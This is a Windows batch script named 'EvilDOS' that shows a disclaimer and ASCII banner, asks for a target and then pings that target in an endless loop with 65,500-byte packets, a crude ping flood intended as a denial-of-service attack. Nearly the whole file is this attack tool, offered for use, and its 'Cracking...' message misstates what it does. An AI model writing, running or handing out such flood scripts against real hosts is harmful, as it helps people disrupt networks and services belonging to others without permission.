@echo off
color 4
chcp 65001 >nul
title EvilDOS
cls
:dis
color 2
cls
echo -----------------------------------------------------------------------------------------------------------------------
echo                                                   =Welcome %username%!=
echo -----------------------------------------------------------------------------------------------------------------------
echo                                                     Disclaimer!
echo                          The author is not responsible for the damage caused by this program.
echo -----------------------------------------------------------------------------------------------------------------------
timeout 3 /nobreak >nul
set/p "disclaimer=Do you agree? (Y-Yes/N-No)"
if %disclaimer%==N exit
if %disclaimer%==Y goto yesdis
if %disclaimer%==n exit
if %disclaimer%==y goto yesdis
echo Error!
timeout 2 /nobreak >nul
cls
goto dis
:yesdis
mshta vbscript:Execute("msgbox ""Welcome %UserName%!!!"",64,""EvilDOS"":close")
:menu
color 4
cls
echo                               ▓█████ ██▒   █▓ ██▓ ██▓    ▓█████▄  ▒█████    ██████ 
echo                               ▓█   ▀▓██░   █▒▓██▒▓██▒    ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
echo                               ▒███   ▓██  █▒░▒██▒▒██░    ░██   █▌▒██░  ██▒░ ▓██▄   
echo                               ▒▓█  ▄  ▒██ █░░░██░▒██░    ░▓█▄   ▌▒██   ██░  ▒   ██▒
echo                               ░▒████▒  ▒▀█░  ░██░░██████▒░▒████▓ ░ ████▓▒░▒██████▒▒
echo                               ░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
echo                                ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
echo                                 ░       ░░   ▒ ░  ░ ░    ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
echo                                 ░  ░     ░   ░      ░  ░   ░        ░ ░        ░  
echo                                    ░                ░                        
set /p target="Enter a goal: "
:ddos
ping %target% -t -l 65500 -w 1 -n 1 >nul
echo Cracking...
goto ddos
